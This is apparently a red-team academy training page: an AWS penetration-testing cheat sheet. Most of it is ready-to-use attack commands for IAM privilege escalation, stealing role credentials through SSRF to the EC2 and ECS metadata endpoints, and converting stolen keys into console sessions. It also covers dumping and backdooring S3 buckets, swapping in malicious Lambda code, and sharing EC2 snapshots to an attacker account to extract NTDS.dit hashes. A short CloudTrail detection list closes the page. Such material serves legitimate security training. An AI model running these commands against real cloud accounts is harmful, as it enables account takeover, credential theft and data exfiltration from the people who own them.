---
layout: training-page
title: "AWS Penetration Testing — Red Team Academy"
module: "Red Team Tools"
tags:
  - aws
  - cloud
  - iam
  - s3
  - ec2
  - metadata
  - ssrf
page_key: "cloud-aws-attacks"
render_with_liquid: false
---

# AWS Penetration Testing

AWS environments are attacked through a combination of credential compromise, IAM privilege escalation, exposed services, and SSRF via the EC2 metadata endpoint. This page covers enumeration, credential theft, IAM escalation, S3 bucket attacks, EC2 exploitation, and the IMDS metadata attack chain.

## Setup & Credential Configuration

```
# Configure AWS CLI profile
aws configure --profile targetprofile
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Or use environment variables (no profile stored on disk)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=wJalrX...
export AWS_SESSION_TOKEN=FQoGZXI...   # Required for temporary credentials

# Verify current identity
aws sts get-caller-identity --profile targetprofile

# Access Key ID Prefixes (identify key type)
# AKIA = long-term IAM access key
# ASIA = temporary STS credential
# AROA = Role
# AIDA = IAM User
# AGPA = Group
```

## Enumeration Tools

```
# ScoutSuite — multi-cloud security audit
python scout.py aws --access-keys \
  --access-key-id AKIA... \
  --secret-access-key wJalrX...

# Pacu — AWS exploitation framework
bash install.sh
python3 pacu.py
set_keys           # Configure credentials
run iam__enum_permissions   # Enumerate IAM permissions
run s3__bucket_finder        # Find S3 buckets
run ec2__enum                # Enumerate EC2 instances

# CloudFox — automated situational awareness (white-box)
cloudfox aws --profile targetprofile all-checks

# enumerate-iam — brute-force what permissions your credentials have
pip install enumerate-iam
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...

# PMapper — graph IAM privilege escalation paths
pip install principalmapper
pmapper graph --create --profile targetprofile
pmapper visualize --filetype png
pmapper query "preset privesc *"          # Find all escalation paths
pmapper query "preset privesc user/PowerUser"

# Prowler — CIS benchmark checks
pip install prowler
prowler aws --profile targetprofile
```

## IAM Enumeration

```
# List users, groups, roles
aws iam list-users
aws iam list-groups
aws iam list-roles

# Get full account authorization detail (dump all IAM as JSON)
aws iam get-account-authorization-details > iam_full.json

# List access keys for current user
aws iam list-access-keys

# Check what policies are attached to your user
aws iam list-attached-user-policies --user-name <YOUR_USER>
aws iam list-user-policies --user-name <YOUR_USER>

# Assume a role (requires sts:AssumeRole permission)
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME \
  --role-session-name my-session

# MFA login — get session token
aws iam list-mfa-devices
aws sts get-session-token --serial-number arn:aws:iam::ACCOUNT:mfa/user --token-code 123456
```

## IAM Privilege Escalation (Shadow Admin)

These individual permissions can be abused to escalate to full admin without having AdministratorAccess directly.

```
# Create a new access key for another user (if iam:CreateAccessKey)
aws iam create-access-key --user-name target_admin_user

# Create a login profile / console password (if iam:CreateLoginProfile)
aws iam create-login-profile --user-name target_user \
  --password 'NewP@ssword!' --no-password-reset-required

# Attach AdministratorAccess policy to yourself (if iam:AttachUserPolicy)
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Add yourself to admin group (if iam:AddUserToGroup)
aws iam add-user-to-group --group-name Admins --user-name my_username

# Create new policy version with admin access (if iam:CreatePolicyVersion)
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/TargetPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Lambda privilege escalation (iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction)
# Create function that grants AdministratorAccess to your user
aws lambda create-function \
  --function-name escalate \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/LambdaAdminRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://escalate.zip

aws lambda invoke --function-name escalate output.txt

# EC2 with admin IAM role (iam:PassRole + ec2:RunInstances)
aws ec2 run-instances --image-id ami-XXXXX --instance-type t2.micro \
  --iam-instance-profile Name=AdminProfile \
  --key-name my_key --security-group-ids sg-XXXXX
```

## Metadata Service SSRF (IMDSv1)

The EC2 Instance Metadata Service (IMDS) at `169.254.169.254` returns IAM credentials when running on an EC2 instance. If you find SSRF, try to reach this endpoint.

```
# IMDSv1 — no token required (exploitable via SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role name, e.g. "my-ec2-role"

# Get temporary credentials for the attached IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 — requires token (use PUT to get token first)
export TOKEN=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Fargate / ECS container credentials
# Check for AWS_CONTAINER_CREDENTIALS_RELATIVE_URI in /proc/self/environ via SSRF
curl "https://target.com/ssrf?url=file:///proc/self/environ"
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/UUID

# Retrieve credentials from ECS metadata endpoint
curl http://169.254.170.2/v2/credentials/<UUID>
# Returns: RoleArn, AccessKeyId, SecretAccessKey, Token
```

## Gaining Console Access from API Keys

```
# Convert API credentials to browser console URL
pip install aws_consoler
aws_consoler -a AKIA[REDACTED] -s [SECRET_KEY]
# Returns: signin.aws.amazon.com/federation?Action=login&...SigninToken=...

# Open the URL in a browser for full console access
```

## S3 Bucket Attacks

### Discovery

```
# Guess bucket names from target name
# Common patterns: target-backup, target-logs, target-assets, target-prod

# Check if bucket exists and is public
curl http://s3.amazonaws.com/<bucket-name>
curl http://<bucket-name>.s3.amazonaws.com

# Find region from DNS
dig <bucket-name>.s3.amazonaws.com
nslookup <resolved-IP>  # Returns: s3-website-us-west-2.amazonaws.com

# Bucket finder tool
./bucket_finder.rb target_keywords_wordlist.txt
./bucket_finder.rb --download --region eu-west-1 wordlist.txt

# grayhatwarfare.com — search indexed public buckets
```

### Interaction

```
# List bucket contents (unauthenticated if public)
aws s3 ls s3://bucket-name --no-sign-request --region us-east-1

# List with authentication
aws s3 ls s3://bucket-name --profile targetprofile

# Download all files
aws s3 sync s3://bucket-name/ ./local-copy/ --no-sign-request --region us-east-1

# Upload a file (if write permission)
aws s3 cp ./backdoor.html s3://bucket-name/backdoor.html

# Check object versions (if versioning enabled — may reveal deleted sensitive files)
aws s3api list-object-versions --bucket bucket-name
aws s3api get-object --bucket bucket-name --key path/to/file.txt \
  --version-id PREVIOUS_VERSION_ID ./recovered.txt
```

### S3 Privilege Escalation via Shadow Copy Attack on EC2

```
# Requires: EC2:CreateSnapshot permission
# Goal: steal NTDS.dit from a Windows EC2 instance

# 1. Find instances
aws ec2 describe-instances --profile victim

# 2. Create snapshot of target instance's volume
aws ec2 create-snapshot --volume-id vol-XXXXXXXXXX

# 3. Share snapshot with your own AWS account
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-XXXXXXXXXX \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids <ATTACKER_ACCOUNT_ID>

# 4. From attacker account — create volume from snapshot
aws ec2 create-volume --snapshot-id snap-XXXXXXXXXX --availability-zone us-east-1a

# 5. Launch Linux EC2, attach the volume, mount it, copy sensitive files
# Then run: secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

## Lambda Attacks

```
# List Lambda functions
aws lambda list-functions --profile targetprofile

# Get function configuration and environment variables (may contain secrets)
aws lambda get-function --function-name target_function
aws lambda get-function-configuration --function-name target_function

# Invoke function
aws lambda invoke --function-name target_function output.txt

# Update function code (if lambda:UpdateFunctionCode permission)
aws lambda update-function-code \
  --function-name target_function \
  --zip-file fileb://malicious_code.zip
```

## AWS URL Patterns (for SSRF/Recon)

```
Service URL formats:
  S3:          https://<bucket>.s3.amazonaws.com
               https://s3.amazonaws.com/<bucket>
  EC2:         https://ec2-<ip-dashes>.compute-1.amazonaws.com
  ELB:         http://<name>-<id>.<region>.elb.amazonaws.com
  RDS:         mysql://<name>.<id>.<region>.rds.amazonaws.com:3306
  API Gateway: https://<id>.execute-api.<region>.amazonaws.com/<stage>
  Elasticsearch: https://<name>-<id>.<region>.es.amazonaws.com
  Lambda:      https://lambda.<region>.amazonaws.com/2015-03-31/functions/
```

## Detection IOCs in CloudTrail

```
# Events to watch for in AWS CloudTrail
GetCallerIdentity     — Attacker checking their permissions
ListBuckets           — S3 enumeration
AssumeRole            — Privilege escalation via role assumption
CreateLoginProfile    — Creating console access for API-only users
AttachUserPolicy      — Attaching admin policy to self
CreateAccessKey       — Creating persistent credentials
InvokeFunction        — Lambda execution
CreateSnapshot        — EC2 volume snapshot (data theft)
GetSecretValue        — Secrets Manager read

# Signs of automated enumeration:
# Hundreds of API calls in seconds from a single access key
# Error codes: AccessDenied in rapid succession (permission brute force)
```

## Key Tools

```
pacu              — github.com/RhinoSecurityLabs/pacu
ScoutSuite        — github.com/nccgroup/ScoutSuite
CloudFox          — github.com/BishopFox/CloudFox
PMapper           — github.com/nccgroup/PMapper
enumerate-iam     — github.com/andresriancho/enumerate-iam
aws_consoler      — github.com/NetSPI/aws_consoler
cloudsplaining    — github.com/salesforce/cloudsplaining
Prowler           — github.com/toniblyx/prowler
bucket_finder     — digi.ninja/projects/bucket_finder
```

## Resources

- InternalAllTheThings AWS — `swisskyrepo.github.io/InternalAllTheThings/cloud/aws/`
- flaws.cloud — AWS vulnerability challenge — `flaws.cloud`
- flaws2.cloud — Level 2 AWS challenge — `flaws2.cloud`
- Cloud Shadow Admin Threat — CyberArk — `cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/`
- AWS Penetration Testing — VirtueSecurity — `virtuesecurity.com`
- Privilege Escalation in the Cloud — Maxime Leblanc — `medium.com/poka-techblog`
